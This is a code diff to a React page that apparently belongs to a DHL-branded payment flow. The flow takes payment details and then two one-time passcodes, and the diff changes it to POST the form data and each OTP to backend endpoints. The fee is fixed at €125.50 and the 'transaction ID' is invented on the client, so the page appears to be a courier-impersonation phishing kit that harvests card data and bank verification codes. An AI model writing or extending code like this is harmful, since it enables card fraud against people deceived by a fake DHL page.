@@ -1,33 +1,64 @@
 import { useState } from "react";
+import { useMutation } from "@tanstack/react-query";
 import DHLPaymentForm, { type PaymentFormData } from "@/components/DHLPaymentForm";
 import OTPVerification from "@/components/OTPVerification";
 import PaymentSuccess from "@/components/PaymentSuccess";
+import { apiRequest } from "@/lib/queryClient";
 
 type PaymentStep = "payment" | "otp1" | "otp2" | "success";
 
 export default function HomePage() {
   const [step, setStep] = useState<PaymentStep>("payment");
-  const [paymentData, setPaymentData] = useState<PaymentFormData | null>(null);
+  const [paymentId, setPaymentId] = useState<string>("");
+  const [transactionId, setTransactionId] = useState<string>("");
+
+  const startPaymentMutation = useMutation({
+    mutationFn: async (data: PaymentFormData) => {
+      const response = await apiRequest("POST", "/api/payment/start", data);
+      const result = await response.json();
+      return result as { paymentId: string };
+    },
+    onSuccess: (data) => {
+      setPaymentId(data.paymentId);
+      setStep("otp1");
+    },
+  });
+
+  const otp1Mutation = useMutation({
+    mutationFn: async (otp: string) => {
+      await apiRequest("POST", `/api/payment/${paymentId}/otp1`, { otp });
+    },
+    onSuccess: () => {
+      setStep("otp2");
+    },
+  });
+
+  const otp2Mutation = useMutation({
+    mutationFn: async (otp: string) => {
+      await apiRequest("POST", `/api/payment/${paymentId}/otp2`, { otp });
+    },
+    onSuccess: () => {
+      setTransactionId(`TXN-${Date.now()}`);
+      setStep("success");
+    },
+  });
 
   const handlePaymentSubmit = (data: PaymentFormData) => {
-    console.log("Payment data submitted:", data);
-    setPaymentData(data);
-    setStep("otp1");
+    startPaymentMutation.mutate(data);
   };
 
   const handleOtp1Submit = (otp: string) => {
-    console.log("OTP 1 submitted:", otp);
-    setStep("otp2");
+    otp1Mutation.mutate(otp);
   };
 
   const handleOtp2Submit = (otp: string) => {
-    console.log("OTP 2 submitted:", otp);
-    setStep("success");
+    otp2Mutation.mutate(otp);
   };
 
   const handleReturnHome = () => {
     setStep("payment");
-    setPaymentData(null);
+    setPaymentId("");
+    setTransactionId("");
   };
 
   return (
@@ -52,7 +83,7 @@ export default function HomePage() {
           onReturnHome={handleReturnHome}
           paymentDetails={{
             amount: "€125.50",
-            transactionId: `TXN-${Date.now()}`,
+            transactionId: transactionId,
             date: new Date().toLocaleDateString("fr-FR"),
           }}
         />
